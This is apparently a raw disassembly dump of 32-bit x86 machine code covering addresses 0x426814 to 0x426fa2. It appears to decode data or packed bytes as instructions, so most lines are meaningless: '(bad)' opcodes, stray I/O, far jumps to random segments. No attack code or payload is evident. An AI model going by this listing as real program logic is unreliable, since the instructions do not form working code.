  426814:	adc    ebx,DWORD PTR [ebx-0x43fae333]
  42681a:	sbb    al,0xbd
  42681c:	icebp  
  42681d:	pop    ds
  42681e:	inc    ecx
  42681f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426820:	jmp    0xdb20:0x31cb0779
  426827:	hlt    
  426828:	sbb    esp,DWORD PTR [eax-0x8]
  42682b:	ret    0xe9e0
  42682e:	sub    DWORD PTR [edi],0x1f0c53eb
  426834:	mov    bh,0x6
  426836:	sub    al,0xe9
  426838:	les    esp,FWORD PTR [edx+0x50]
  42683b:	cmp    bl,BYTE PTR [ecx-0x1ca8cfac]
  426841:	jno    0x4268bc
  426843:	mov    ds:0xae37560,al
  426848:	fnstcw WORD PTR [edx]
  42684a:	sti    
  42684b:	push   ebx
  42684c:	mov    al,cs:0x7dac4be3
  426852:	aam    0xd7
  426854:	fst    QWORD PTR [ebx]
  426856:	repnz fistp DWORD PTR [esi+esi*8-0x59948dcb]
  42685e:	out    dx,al
  42685f:	inc    edx
  426860:	fisubr WORD PTR [esi]
  426862:	sub    BYTE PTR [ebx],dh
  426864:	jle    0x42682b
  426866:	fwait
  426867:	adc    BYTE PTR [esi-0x28],bl
  42686a:	retf   
  42686b:	pop    edi
  42686c:	mov    ebp,DWORD PTR ds:0x3a683d9f
  426872:	or     BYTE PTR [edi],ch
  426874:	ret    0x6784
  426877:	es dec ebp
  426879:	loopne 0x4268a9
  42687b:	or     BYTE PTR [edi+0x3d],cl
  42687e:	sar    BYTE PTR [ecx],cl
  426880:	mov    ds:0x51045d40,al
  426885:	stos   DWORD PTR es:[edi],eax
  426886:	sbb    dh,al
  426888:	mov    dh,0xc0
  42688a:	sub    edx,ebx
  42688c:	xchg   edx,eax
  42688d:	retf   0x77c8
  426890:	rep stos DWORD PTR es:[edi],eax
  426892:	sub    ecx,DWORD PTR [edi-0x1a]
  426895:	jne    0x4268b0
  426897:	arpl   WORD PTR [ebp+0x2d8f4e92],ax
  42689d:	int3   
  42689e:	(bad)  
  42689f:	inc    edi
  4268a0:	scas   al,BYTE PTR es:[edi]
  4268a1:	xchg   ecx,eax
  4268a2:	mov    esi,0x1d33da90
  4268a7:	inc    ebx
  4268a8:	pop    ecx
  4268a9:	hlt    
  4268aa:	mov    ecx,0x7f40ed95
  4268af:	sti    
  4268b0:	or     al,0x4f
  4268b2:	pop    esp
  4268b3:	lods   eax,DWORD PTR ds:[esi]
  4268b4:	dec    eax
  4268b5:	xchg   ebp,eax
  4268b6:	inc    edi
  4268b7:	sbb    al,0x14
  4268b9:	jnp    0x426935
  4268bb:	mov    ebx,0x3ffb43d9
  4268c0:	outs   dx,BYTE PTR ds:[esi]
  4268c1:	sub    al,BYTE PTR [edx]
  4268c3:	mov    esi,ecx
  4268c5:	in     eax,0x5d
  4268c7:	test   BYTE PTR [edi-0x6a],dh
  4268ca:	sub    bl,al
  4268cc:	(bad)  
  4268cd:	stos   DWORD PTR es:[edi],eax
  4268ce:	push   eax
  4268cf:	and    al,0xb
  4268d1:	hlt    
  4268d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268d3:	or     eax,0xb2c07795
  4268d8:	cdq    
  4268d9:	adc    DWORD PTR [ebx-0x7a],edi
  4268dc:	xchg   esp,eax
  4268dd:	cmp    eax,0x9ee22d00
  4268e2:	dec    edi
  4268e3:	mov    WORD PTR [esi-0x2a62403d],cs
  4268e9:	push   es
  4268ea:	xor    eax,0x9f937044
  4268ef:	sbb    DWORD PTR fs:[ecx+0x4a84a4ca],eax
  4268f6:	enter  0x9b7,0x5b
  4268fa:	aad    0x75
  4268fc:	scas   al,BYTE PTR es:[edi]
  4268fd:	loopne 0x426973
  4268ff:	outs   dx,DWORD PTR ds:[esi]
  426900:	push   ecx
  426901:	sub    BYTE PTR [edi-0x68],ah
  426904:	dec    ecx
  426905:	xchg   BYTE PTR [esi+0x2a],al
  426908:	jl     0x4268d6
  42690a:	scas   al,BYTE PTR es:[edi]
  42690b:	jl     0x4268f1
  42690d:	or     al,0x4b
  42690f:	repz out dx,al
  426911:	xchg   edi,eax
  426912:	gs aam 0x87
  426915:	jle    0x4268ea
  426917:	arpl   WORD PTR [ecx+0x1711be21],sp
  42691d:	ss xchg esp,eax
  42691f:	rol    DWORD PTR ds:0xa276c0d7,cl
  426925:	cwde   
  426926:	pop    ss
  426927:	xor    BYTE PTR ds:0x6df2bab6,cl
  42692d:	push   esp
  42692e:	or     eax,ecx
  426930:	adc    al,BYTE PTR [eax]
  426932:	in     al,dx
  426933:	into   
  426934:	stos   DWORD PTR es:[edi],eax
  426935:	ja     0x4268cd
  426937:	repnz push ss
  426939:	outs   dx,DWORD PTR ds:[esi]
  42693a:	out    dx,eax
  42693b:	mov    bl,0xd6
  42693d:	pop    ebp
  42693e:	push   ebx
  42693f:	out    0x20,eax
  426941:	stos   BYTE PTR es:[edi],al
  426942:	retf   0xd354
  426945:	xchg   edi,eax
  426946:	push   cs
  426947:	jecxz  0x4269b2
  426949:	out    dx,eax
  42694a:	mov    bl,BYTE PTR [edi+0xb]
  42694d:	lea    eax,[edx-0xde6f4d4]
  426953:	ds pop ss
  426955:	mov    al,ds:0x2c2df705
  42695a:	xor    al,0x7c
  42695c:	adc    esp,ecx
  42695e:	jg     0x4269a7
  426960:	clc    
  426961:	inc    ebp
  426962:	sub    edi,DWORD PTR [ebx]
  426964:	les    eax,FWORD PTR [ebx-0x4e]
  426967:	ins    DWORD PTR es:[edi],dx
  426968:	sti    
  426969:	pop    ebp
  42696b:	mov    al,0x44
  42696d:	pop    ecx
  42696e:	into   
  42696f:	xchg   esi,eax
  426970:	(bad)  
  426971:	and    eax,0xff408a91
  426976:	ja     0x4269e8
  426978:	or     al,0xa0
  42697a:	jno    0x426904
  42697c:	sahf   
  42697d:	mov    ds:0x1a4c51f8,eax
  426982:	ret    0x5280
  426985:	pop    eax
  426986:	in     al,dx
  426987:	push   ebp
  426988:	mov    al,ds:0x26c95fbb
  42698d:	es je  0x42694c
  426990:	sbb    BYTE PTR [ebp+0x67],bh
  426993:	in     eax,dx
  426994:	stos   BYTE PTR es:[edi],al
  426995:	retf   0x6eef
  426998:	dec    edi
  426999:	inc    esp
  42699a:	push   esp
  42699b:	xchg   DWORD PTR [eax-0x51],eax
  42699e:	adc    eax,0x835ee3a9
  4269a3:	fmul   QWORD PTR [ebx+edi*2+0x22d33fd8]
  4269aa:	jnp    0x426a05
  4269ac:	jne    0x42697b
  4269ae:	push   edi
  4269af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269b0:	ss popf 
  4269b2:	cwde   
  4269b3:	push   eax
  4269b4:	cli    
  4269b5:	je     0x426966
  4269b7:	dec    edi
  4269b8:	inc    eax
  4269b9:	in     eax,dx
  4269ba:	loopne 0x426981
  4269bc:	jmp    0x39b6ae73
  4269c1:	xchg   ebx,eax
  4269c2:	in     al,0xce
  4269c4:	loope  0x4269fa
  4269c6:	push   ebx
  4269c7:	adc    ch,BYTE PTR [esp+ecx*2]
  4269ca:	push   ds
  4269cb:	jg     0x4269cc
  4269cd:	outs   dx,BYTE PTR ds:[esi]
	...
  4269da:	mov    cl,BYTE PTR [esp+eax*8-0x61253926]
  4269e1:	fcomp  QWORD PTR [edi+0x23]
  4269e4:	or     al,0x8a
  4269e6:	xchg   esi,eax
  4269e7:	or     BYTE PTR [ecx],dh
  4269e9:	sbb    al,0x4c
  4269eb:	loopne 0x4269ee
  4269ed:	add    ah,bh
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    dl,ch
  4269f3:	dec    ebx
  4269f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269f5:	clc    
  4269f6:	mov    edx,0x96e803d0
  4269fb:	pop    ebx
  4269fc:	repnz mov al,ds:0xe9bad63a
  426a02:	sbb    DWORD PTR [ebp+0x4ec5ef9e],esp
  426a08:	sahf   
  426a09:	or     bh,0xbf
  426a0c:	or     eax,DWORD PTR [ebx]
  426a0e:	or     eax,0xeef26daf
  426a13:	jne    0x426a1b
  426a15:	mov    ch,0x38
  426a17:	clc    
  426a18:	shl    BYTE PTR [edi],cl
  426a1a:	rcr    bh,0x50
  426a1d:	cmc    
  426a1e:	add    bl,BYTE PTR [edi+0x40]
  426a21:	mov    edx,0xf12db4cb
  426a26:	mov    al,0xd
  426a28:	out    0xb0,al
  426a2a:	pop    ecx
  426a2b:	mov    WORD PTR [esi],es
  426a2d:	push   edx
  426a2e:	imul   edx,DWORD PTR [ebx],0xfffffff9
  426a31:	mov    BYTE PTR [ebx-0x1ded35e9],0x6a
  426a38:	sub    esp,DWORD PTR [ebp-0x73703c80]
  426a3e:	loope  0x4269ce
  426a40:	xchg   edi,eax
  426a41:	stos   DWORD PTR es:[edi],eax
  426a42:	cmp    ah,BYTE PTR [eax+0x3e]
  426a45:	inc    edx
  426a46:	mov    ch,0x9c
  426a48:	ins    DWORD PTR es:[edi],dx
  426a49:	jl     0x426a4f
  426a4b:	stos   DWORD PTR es:[edi],eax
  426a4c:	fld    QWORD PTR [ecx+0x3cf24999]
  426a52:	sbb    ecx,0xc4078623
  426a58:	daa    
  426a59:	fiadd  WORD PTR [esi+0x50]
  426a5c:	cmc    
  426a5d:	iret   
  426a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a5f:	mov    edi,0x4bcec17c
  426a64:	jne    0x426aad
  426a66:	repnz enter 0xb23f,0xfa
  426a6b:	adc    DWORD PTR [ecx],ecx
  426a6d:	push   0xffffffe6
  426a6f:	xchg   DWORD PTR [ecx-0x3a],esi
  426a72:	arpl   WORD PTR [edi],cx
  426a74:	push   cs
  426a75:	(bad)  
  426a76:	sahf   
  426a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a78:	sti    
  426a79:	sbb    DWORD PTR [edx],ebx
  426a7b:	iret   
  426a7c:	push   0x798793d8
  426a81:	jge    0x426ad6
  426a83:	adc    BYTE PTR [ebp+0x1994b66a],dh
  426a89:	lock loopne 0x426a16
  426a8c:	pop    edi
  426a8d:	mov    al,0x23
  426a8f:	popf   
  426a90:	inc    ecx
  426a91:	mov    ch,0xd5
  426a93:	inc    eax
  426a94:	cdq    
  426a95:	(bad)  [esi+edx*4+0x4]
  426a99:	mov    WORD PTR [esi+0x25],ds
  426a9c:	stos   DWORD PTR es:[edi],eax
  426a9d:	in     al,0xf2
  426a9f:	inc    ecx
  426aa0:	push   eax
  426aa1:	call   0xdc4c:0x7a2cbdb0
  426aa8:	jo     0x426acc
  426aaa:	pop    esi
  426aab:	pop    esi
  426aac:	daa    
  426aad:	jno    0x426b0e
  426aaf:	push   edi
  426ab0:	jbe    0x426adf
  426ab2:	and    dl,BYTE PTR [edx]
  426ab4:	dec    edi
  426ab5:	hlt    
  426ab6:	ins    BYTE PTR es:[edi],dx
  426ab7:	jmp    0x426b0a
  426ab9:	stos   BYTE PTR es:[edi],al
  426aba:	retf   0x489f
  426abd:	add    BYTE PTR [eax+0x15d1aa50],ah
  426ac3:	and    eax,0x79c103dd
  426ac8:	jmp    0x426b07
  426aca:	cs or  al,0x7e
  426acd:	xlat   BYTE PTR ds:[ebx]
  426ace:	jb     0x426ad3
  426ad0:	jmp    0x426a9e
  426ad2:	push   ss
  426ad3:	mov    cs,ebp
  426ad5:	fistp  DWORD PTR ds:0x2d4ef649
  426adb:	push   edi
  426adc:	in     eax,dx
  426add:	add    bl,bh
  426adf:	sub    cl,dl
  426ae1:	inc    ebp
  426ae2:	inc    esp
  426ae3:	fiadd  DWORD PTR ds:0x3f735076
  426ae9:	test   BYTE PTR [ebx],dl
  426aeb:	mov    al,0xc0
  426aed:	add    eax,ecx
  426aef:	arpl   WORD PTR [edx+esi*1+0x64],di
  426af3:	dec    esi
  426af4:	stos   BYTE PTR es:[edi],al
  426af5:	xchg   edx,eax
  426af6:	imul   ebx,DWORD PTR [esi],0x7b
  426af9:	or     DWORD PTR [eax+0x1d],ecx
  426afc:	fsubr  QWORD PTR [esi]
  426afe:	jg     0x426b2c
  426b00:	lods   al,BYTE PTR ds:[esi]
  426b01:	sahf   
  426b02:	push   esi
  426b03:	test   DWORD PTR [edi],esp
  426b05:	adc    ecx,ebx
  426b07:	test   BYTE PTR [esi-0x1e],dh
  426b0a:	call   0x413e:0xcf6c29c2
  426b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b12:	add    DWORD PTR [ebp+0x10c97f6b],esp
  426b18:	or     DWORD PTR [esi-0xc],ebx
  426b1b:	cmp    BYTE PTR [edx-0x5255a9b2],cl
  426b21:	mov    ebp,0xe18cfb03
  426b26:	test   edx,ebp
  426b28:	ret    
  426b29:	adc    BYTE PTR [ecx-0x10b804db],dh
  426b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b30:	pop    esi
  426b31:	inc    esp
  426b32:	mov    ah,0x7b
  426b34:	mov    ds:0xf241cf4,al
  426b39:	mov    cl,al
  426b3b:	xlat   BYTE PTR ds:[ebx]
  426b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b3d:	cmp    ebp,DWORD PTR [edx]
  426b3f:	sub    edi,DWORD PTR [esi+0x37]
  426b42:	je     0x426ad9
  426b44:	jg     0x426b5f
  426b46:	iret   
  426b47:	xor    esi,DWORD PTR [edi]
  426b49:	sbb    DWORD PTR [ecx-0x28],edx
  426b4c:	loopne 0x426b42
  426b4e:	outs   dx,DWORD PTR ds:[esi]
  426b4f:	adc    eax,0x51fed63f
  426b54:	pop    ecx
  426b55:	fimul  DWORD PTR [ecx-0x50d3d80c]
  426b5b:	sahf   
  426b5c:	xchg   esi,eax
  426b5d:	dec    esp
  426b5e:	pusha  
  426b5f:	mov    ebx,0xed087df7
  426b64:	xchg   DWORD PTR [ebx+0x4396a699],eax
  426b6a:	fadd   DWORD PTR [ecx+ebx*2+0x41572d23]
  426b71:	dec    esp
  426b72:	dec    esi
  426b73:	cwde   
  426b74:	in     eax,0x7d
  426b76:	mov    al,ds:0x64d6172e
  426b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b7c:	sbb    DWORD PTR [esi],0xffffff82
  426b7f:	mov    WORD PTR [esi+0x2c79cecf],?
  426b85:	mov    bh,0x1e
  426b87:	stos   DWORD PTR es:[edi],eax
  426b88:	xchg   edi,eax
  426b89:	aad    0xf1
  426b8b:	out    0xf4,al
  426b8d:	std    
  426b8e:	jecxz  0x426b20
  426b90:	imul   ebx,DWORD PTR [edi+0x4e],0x2a
  426b94:	mov    bh,0x73
  426b96:	gs mov edx,0xc4a35b7b
  426b9c:	cmc    
  426b9d:	xchg   ebx,eax
  426b9e:	pop    ebp
  426b9f:	sub    DWORD PTR [ecx-0x1e],esp
  426ba2:	je     0x426b60
  426ba4:	out    0x99,eax
  426ba6:	call   0x4ce1:0x6f5d2536
  426bad:	dec    esp
  426bae:	sbb    BYTE PTR [edx],bh
  426bb0:	daa    
  426bb1:	rcl    DWORD PTR ds:0x54d74ea5,1
  426bb7:	je     0x426bb1
  426bb9:	xchg   edi,eax
  426bba:	div    BYTE PTR [ecx-0x8]
  426bbd:	inc    ebx
  426bbe:	aaa    
  426bbf:	jne    0x426c20
  426bc1:	inc    eax
  426bc2:	aas    
  426bc3:	lods   eax,DWORD PTR ds:[esi]
  426bc4:	inc    edx
  426bc5:	xchg   ecx,eax
  426bc6:	or     BYTE PTR [edi-0x47],0x3
  426bca:	dec    esi
  426bcc:	daa    
  426bcd:	sub    eax,0xa0d5f0b6
  426bd2:	or     bl,bh
  426bd4:	push   ebx
  426bd5:	inc    eax
  426bd6:	enter  0xf865,0x2c
  426bda:	rol    BYTE PTR [edx+0x45],1
  426bdd:	icebp  
  426bde:	jns    0x426c45
  426be0:	mov    DWORD PTR [ebx-0x3f67fad4],ecx
  426be6:	lock mov cl,0xb9
  426be9:	pop    esi
  426bea:	loopne 0x426b8e
  426bec:	adc    bh,BYTE PTR [ebx+0x0]
	...
  426bf7:	add    BYTE PTR [eax],al
  426bf9:	add    BYTE PTR [eax-0x56],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0x17fe433f,al
  426c07:	jl     0x426c23
  426c09:	in     eax,dx
  426c0a:	dec    eax
  426c0b:	loop   0x426c0e
  426c0d:	add    ah,bh
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [ebp-0x65],cl
  426c14:	sbb    al,0x4d
  426c16:	inc    edi
  426c17:	mov    DWORD PTR [esi],ebx
  426c19:	ds std 
  426c1b:	pusha  
  426c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c1d:	push   0x5d
  426c1f:	sar    dh,0xc5
  426c22:	fs iret 
  426c24:	or     al,0x77
  426c26:	xchg   DWORD PTR [edx],eax
  426c28:	in     al,dx
  426c29:	cs jle 0x426c5f
  426c2c:	test   DWORD PTR [edi+esi*8],edi
  426c2f:	out    dx,al
  426c30:	push   0x848ecf95
  426c35:	mov    dl,0x81
  426c37:	icebp  
  426c38:	xchg   edx,eax
  426c39:	retf   0x2ace
  426c3c:	push   edi
  426c3d:	xchg   esi,eax
  426c3e:	push   ds
  426c3f:	scas   al,BYTE PTR es:[edi]
  426c40:	retf   0x1223
  426c43:	test   eax,0x5012eb2a
  426c48:	xchg   edx,eax
  426c49:	cmp    eax,esp
  426c4b:	mov    ds:0x4384cc4c,eax
  426c50:	xchg   BYTE PTR [edx],dl
  426c52:	fldenv [edi+eiz*2+0x2ea9c3ec]
  426c59:	add    ah,cl
  426c5b:	fld    DWORD PTR [edi+eax*2-0x57ab14ba]
  426c62:	push   ds
  426c63:	outs   dx,DWORD PTR ds:[esi]
  426c64:	mov    esi,0x91be6ced
  426c69:	dec    DWORD PTR ds:0xd351d67b
  426c6f:	cmp    edi,ebx
  426c71:	mov    ch,0x11
  426c73:	aad    0x81
  426c75:	push   edi
  426c76:	adc    eax,0xe0c3d68d
  426c7b:	pop    esi
  426c7c:	shl    DWORD PTR [ebx-0x663731e0],0xd1
  426c83:	shr    DWORD PTR [esp+esi*8],1
  426c86:	push   cs
  426c87:	push   edi
  426c88:	xor    DWORD PTR [ecx-0x2],esi
  426c8b:	xchg   ecx,eax
  426c8c:	dec    esp
  426c8d:	pop    ebp
  426c8e:	cmp    eax,esi
  426c90:	fld    st(1)
  426c92:	xlat   BYTE PTR ds:[ebx]
  426c93:	jge    0x426c8c
  426c95:	sar    DWORD PTR [edi+edi*2-0x6c3bb0bd],1
  426c9c:	adc    al,0x6c
  426c9e:	and    esp,DWORD PTR [edi+0x3a]
  426ca1:	test   al,0x7c
  426ca3:	add    bh,0x5c
  426ca6:	inc    ecx
  426ca7:	xor    esi,edi
  426ca9:	xlat   BYTE PTR ds:[ebx]
  426caa:	mov    BYTE PTR [esi+eiz*1-0x29],0xc
  426caf:	popa   
  426cb0:	ds pop es
  426cb2:	out    dx,eax
  426cb3:	ret    
  426cb4:	mov    eax,ds:0x89045d3
  426cb9:	int    0x83
  426cbb:	xor    al,0xda
  426cbe:	sbb    al,0x54
  426cc0:	nop
  426cc1:	repnz and al,0x57
  426cc4:	xchg   edx,eax
  426cc5:	imul   ebx,DWORD PTR [edi-0x4dee4053],0xf166f004
  426ccf:	lds    edi,FWORD PTR [ebp+0x4a]
  426cd2:	and    eax,0x500ccd73
  426cd7:	loop   0x426d57
  426cd9:	pop    ecx
  426cda:	mov    ah,BYTE PTR [esi+0x72802969]
  426ce0:	push   ss
  426ce1:	(bad)  
  426ce2:	sar    BYTE PTR [edx],cl
  426ce4:	sub    bl,BYTE PTR [edi+0x16]
  426ce7:	or     esp,ebx
  426ce9:	push   0x4a
  426ceb:	xor    eax,0xf9e54e7c
  426cf0:	stos   DWORD PTR es:[edi],eax
  426cf1:	(bad)  
  426cf2:	dec    esi
  426cf3:	neg    DWORD PTR [esi+ecx*8]
  426cf6:	les    esi,FWORD PTR [esi+0x7af2e6cb]
  426cfc:	jo     0x426d09
  426cfe:	sub    eax,0x8f27aae1
  426d03:	mov    eax,ds:0xc735611b
  426d08:	ss stos BYTE PTR es:[edi],al
  426d0a:	inc    eax
  426d0b:	gs ins BYTE PTR es:[edi],dx
  426d0d:	ret    
  426d0e:	gs dec ecx
  426d10:	push   0xffffff8c
  426d12:	pop    ds
  426d13:	retf   0x816e
  426d16:	mov    edi,0xd7645a20
  426d1b:	rol    ch,1
  426d1d:	loop   0x426d80
  426d1f:	mov    ds:0x6ebc2f3b,eax
  426d24:	imul   edx,DWORD PTR [eax],0x5
  426d27:	xchg   ebx,eax
  426d28:	stos   DWORD PTR es:[edi],eax
  426d29:	mov    ch,dl
  426d2b:	cmp    BYTE PTR [ebx+0x66a2e047],bh
  426d31:	pop    ds
  426d32:	enter  0x858d,0x6
  426d36:	stc    
  426d37:	mov    gs,WORD PTR [ecx+0x5d15698c]
  426d3d:	mov    al,0xae
  426d3f:	mov    edx,0x934572e8
  426d44:	test   DWORD PTR [edx+0x23e0eacb],ebp
  426d4a:	or     al,0x96
  426d4c:	inc    esp
  426d4d:	pop    ebx
  426d4e:	xchg   ecx,eax
  426d4f:	stc    
  426d50:	inc    esp
  426d51:	and    bh,dl
  426d53:	scas   eax,DWORD PTR es:[edi]
  426d54:	sar    bh,0xbf
  426d57:	ins    BYTE PTR es:[edi],dx
  426d58:	inc    esp
  426d59:	retf   0x50f0
  426d5c:	int3   
  426d5d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  426d5f:	pop    ebx
  426d60:	fild   QWORD PTR [edx]
  426d62:	cmp    esp,ebp
  426d64:	adc    ecx,DWORD PTR [edx]
  426d66:	(bad)  
  426d67:	and    eax,0xb1135bd9
  426d6c:	mov    dh,0x12
  426d6e:	into   
  426d6f:	mov    bl,0xc
  426d71:	cmp    cl,dl
  426d73:	mov    al,0x67
  426d75:	or     BYTE PTR [eax],ch
  426d77:	out    dx,eax
  426d78:	push   ss
  426d79:	ds clc 
  426d7b:	mov    ss,WORD PTR [esi+0x70086749]
  426d81:	pop    esi
  426d82:	xchg   BYTE PTR [ebx],dh
  426d84:	repz fisubr DWORD PTR [edi]
  426d87:	pushf  
  426d88:	sbb    eax,0x4798c126
  426d8d:	xchg   edx,eax
  426d8e:	inc    ecx
  426d8f:	ss into 
  426d91:	cs into 
  426d93:	and    eax,0x786dc884
  426d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d99:	and    ah,BYTE PTR [edx+0x4dd80a6e]
  426d9f:	cmp    ebp,DWORD PTR es:[eax-0x4a]
  426da3:	push   ebp
  426da4:	cmp    eax,ebp
  426da6:	fsub   DWORD PTR [eax]
  426da8:	rol    ebx,cl
  426daa:	cld    
  426dab:	and    al,0x6e
  426dad:	pusha  
  426dae:	in     eax,dx
  426daf:	in     al,0x3c
  426db1:	and    DWORD PTR [eax],0xae1a7411
  426db7:	sub    eax,0x62fa730b
  426dbc:	dec    ebp
  426dbd:	mov    cl,0xa1
  426dbf:	xchg   esp,eax
  426dc0:	cmp    BYTE PTR [ecx-0x4c],dh
  426dc3:	inc    esp
  426dc4:	inc    edx
  426dc5:	fmul   DWORD PTR [ebx-0x7a4e9dd1]
  426dcb:	aas    
  426dcc:	repz pop esp
  426dce:	pushf  
  426dcf:	xlat   BYTE PTR ds:[ebx]
  426dd0:	inc    eax
  426dd1:	fdiv   DWORD PTR [esi+0xc4518a8]
  426dd7:	jbe    0x426e3d
  426dd9:	xchg   ebp,eax
  426dda:	push   cs
  426ddb:	cmp    esi,esi
  426ddd:	push   ss
  426dde:	and    BYTE PTR [eax+0x4b],0x47
  426de2:	mov    al,dh
  426de4:	mov    bl,0x87
  426de6:	lock sahf 
  426de8:	cmp    al,0x32
  426dea:	psubq  mm1,QWORD PTR [ecx-0x74647bc0]
  426df1:	and    cl,bh
  426df3:	ret    
  426df4:	dec    ecx
  426df5:	arpl   WORD PTR [eax],bx
  426df7:	popa   
  426df8:	(bad)  
  426df9:	je     0x426e1e
  426dfb:	add    ebp,DWORD PTR [eax+eax*4+0x4a666e7f]
  426e02:	jns    0x426db2
  426e04:	mov    ds:0x4390cc4b,eax
  426e09:	adc    ah,BYTE PTR ds:0xb3bfeb
	...
  426e17:	add    BYTE PTR [eax],al
  426e19:	add    BYTE PTR [esi-0x28ab281c],dh
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	call   0x1e4:0x44fe5287
  426e2d:	add    ah,bh
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [ebp+0x1c77ce8d],dh
  426e37:	ja     0x426e07
  426e39:	retf   
  426e3a:	lods   al,BYTE PTR ds:[esi]
  426e3b:	inc    ecx
  426e3c:	mov    edi,0xc2ec61b9
  426e41:	fwait
  426e42:	jge    0x426e65
  426e44:	add    edx,ebp
  426e46:	mov    edi,0x31da30b
  426e4b:	gs enter 0x2cc3,0x73
  426e50:	popf   
  426e51:	pushf  
  426e52:	xchg   esp,eax
  426e53:	jle    0x426e41
  426e55:	outs   dx,BYTE PTR ds:[esi]
  426e56:	cmp    al,0x4a
  426e58:	xor    BYTE PTR [ecx],al
  426e5a:	fs popf 
  426e5c:	arpl   WORD PTR [ebp+eax*4+0x6],bx
  426e60:	cmp    ebp,ebp
  426e62:	cdq    
  426e63:	pop    ds
  426e64:	pop    edi
  426e65:	out    0x76,eax
  426e67:	inc    edx
  426e68:	aas    
  426e69:	shl    eax,1
  426e6b:	mov    ds:0xc76cecaf,eax
  426e70:	dec    eax
  426e71:	into   
  426e72:	inc    edx
  426e73:	cmp    bl,bh
  426e75:	mov    cl,0x7
  426e77:	xchg   esp,eax
  426e78:	xchg   esi,eax
  426e79:	clc    
  426e7a:	push   esi
  426e7b:	js     0x426e29
  426e7d:	bound  esp,QWORD PTR [ecx+eax*1-0x41]
  426e81:	sub    BYTE PTR [esi],0x26
  426e84:	adc    eax,0xed23ca05
  426e89:	xor    eax,0xa1a69e04
  426e8e:	add    al,0x24
  426e90:	mov    WORD PTR [eax-0x42],ss
  426e93:	lock in al,0xba
  426e96:	sbb    dl,BYTE PTR [esi-0x47]
  426e99:	add    ebx,DWORD PTR [esi-0x30]
  426e9c:	ret    
  426e9d:	mov    edi,0xf392fec2
  426ea2:	xchg   esp,eax
  426ea3:	lea    esp,[esp+esi*8+0x547bd8a0]
  426eaa:	sbb    DWORD PTR [edx-0x71],0x269944ba
  426eb1:	dec    esi
  426eb2:	test   BYTE PTR [ebp-0x2e],0x15
  426eb6:	xor    eax,0xd33739b2
  426ebb:	sahf   
  426ebc:	push   es
  426ebd:	sbb    ecx,DWORD PTR [eax+0x57]
  426ec0:	adc    esi,DWORD PTR [esi-0x7e500680]
  426ec6:	sub    dh,0x3
  426ec9:	sbb    ch,al
  426ecb:	sbb    dh,BYTE PTR ds:0x75331fd5
  426ed1:	or     eax,0x829cb7f3
  426ed6:	inc    esi
  426ed7:	adc    eax,0x6ef9916c
  426edc:	data16 or BYTE PTR [eax-0x663c0024],0xa6
  426ee4:	and    eax,0xc6a1d6d9
  426ee9:	les    ebp,FWORD PTR [ebx]
  426eeb:	jmp    0x426f2b
  426eed:	mov    ah,0x83
  426eef:	jmp    0xd5b2:0x279b9730
  426ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ef7:	mov    bl,0xa4
  426efa:	mov    ds:0x22358f76,eax
  426eff:	das    
  426f00:	push   cs
  426f01:	pop    esi
  426f02:	or     edx,edx
  426f04:	fs mov edx,0x32f17044
  426f0a:	mov    ds:0xb891104a,al
  426f0f:	jns    0x426f43
  426f11:	add    bh,BYTE PTR [esi+0x253e8203]
  426f17:	fidiv  DWORD PTR [esi+0x6c4940eb]
  426f1d:	cmp    al,dl
  426f1f:	pop    ebx
  426f20:	or     DWORD PTR [esi+edi*4+0x12],ecx
  426f24:	sti    
  426f25:	mov    bh,0x56
  426f27:	int    0xa5
  426f29:	inc    edi
  426f2a:	jns    0x426f0a
  426f2c:	pop    eax
  426f2d:	out    dx,eax
  426f2e:	(bad)  
  426f2f:	sahf   
  426f30:	push   ds
  426f31:	(bad)  
  426f32:	arpl   WORD PTR [eax+0x3a9dd0a0],di
  426f38:	gs xor eax,0x138bee6f
  426f3e:	enter  0xfc82,0x1d
  426f42:	add    al,0x55
  426f44:	stc    
  426f45:	inc    ebx
  426f46:	mov    edi,0x95556856
  426f4b:	mov    ds:0x705ab9fb,al
  426f50:	inc    eax
  426f51:	out    dx,al
  426f52:	iret   
  426f53:	sub    BYTE PTR [ebx],ch
  426f55:	mov    ebp,DWORD PTR [ebx+0x45e14fde]
  426f5b:	push   ss
  426f5c:	aaa    
  426f5d:	mov    eax,ds:0xccd28dd3
  426f62:	or     bh,al
  426f64:	and    DWORD PTR [edi+ebp*1-0x4114c2c4],edi
  426f6b:	sub    al,0x98
  426f6d:	jbe    0x426ef3
  426f6f:	scas   al,BYTE PTR es:[edi]
  426f70:	aad    0x33
  426f72:	xchg   ebx,eax
  426f73:	gs pop es
  426f75:	mov    es,WORD PTR [edi-0x4911c2a6]
  426f7b:	out    dx,al
  426f7c:	xor    ch,bl
  426f7e:	test   al,0x73
  426f80:	fcomp  DWORD PTR [edi-0x3f]
  426f83:	or     DWORD PTR [edx+0x600ae363],edi
  426f89:	pop    esi
  426f8a:	sbb    DWORD PTR [eax+0x5a6da2],ecx
  426f90:	(bad)
  426f93:	cmp    eax,0xb1e29e16
  426f98:	xor    eax,0x596fed18
  426f9d:	pop    esi
  426f9e:	xchg   ecx,eax
  426f9f:	add    DWORD PTR [eax+0x20],ecx
  426fa2:	pop    ss
